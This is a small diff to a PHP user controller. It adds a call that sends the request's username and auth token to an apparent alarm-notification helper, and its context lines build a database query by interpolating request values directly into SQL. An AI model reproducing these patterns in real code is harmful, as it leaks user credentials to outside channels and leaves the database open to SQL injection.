@@ -31,6 +31,7 @@ class UserController extends UserBase
         if(!$this->checkRouter()){
             $appId = $this->getRequestData('username') ?? '';
             $token = $this->getRequestData('token') ?? '';
+            dingAlarmSimple(['$appId'=>$appId,'$token'=>$token]);
             if (empty($token) || empty($appId)) return $this->writeJson(201, null, null, '参数不可以为空');
             $info = RequestUserInfo::create()->where("token = '{$token}' and appId = '{$appId}'")->get();
             if (empty($info)) {
